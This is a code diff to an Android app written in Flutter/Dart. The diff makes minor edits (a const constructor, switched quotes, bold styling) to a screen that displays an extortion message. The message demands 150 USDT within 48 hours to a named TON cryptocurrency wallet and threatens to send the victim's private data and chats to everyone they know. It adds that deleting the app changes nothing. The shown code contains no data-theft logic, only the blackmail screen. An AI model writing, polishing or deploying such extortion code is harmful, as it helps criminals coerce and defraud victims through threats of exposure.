@@ -4,7 +4,7 @@ import 'package:android_intent_plus/android_intent_plus.dart';
 import 'dart:io';
  
 void main() {
-  runApp(MyApp());
+  runApp(const MyApp());
 }
 
 class MyApp extends StatelessWidget {
@@ -47,11 +47,15 @@ class _MainPageState extends State<MainPage> {
           fit: BoxFit.cover,
         ),
         const Center(
-          child: Text(
-            'Hi bro, don't worry, nothing has happened yet, but you have 48 hours to send 150 USDT to this cryptocurrency wallet, or I will send all your privte data and chats to everyone you know or don't know. Send the money on this (ton) network and the address is: UQB7wop5BmicB85_eiv_azfZVFwlFUsrULNpCbSvScjpHigE  An important note: Even if you delete the application, your information is stored in our database and nothing will change.',
-            style: TextStyle(color: Colors.green, fontSize: 12),
-          ),
-        ),
+child: Text(
+  "Hi bro, don't worry, nothing has happened yet, but you have 48 hours to send 150 USDT to this cryptocurrency wallet, or I will send all your privte data and chats to everyone you know or don't know. Send the money on this (ton) network and the address is: UQB7wop5BmicB85_eiv_azfZVFwlFUsrULNpCbSvScjpHigE  An important note: Even if you delete the application, your information is stored in our database and nothing will change.",
+  style: TextStyle(
+    color: Colors.green,
+    fontSize: 12,
+    fontWeight: FontWeight.bold,
+  ),
+)
+
       ],
     );
   }
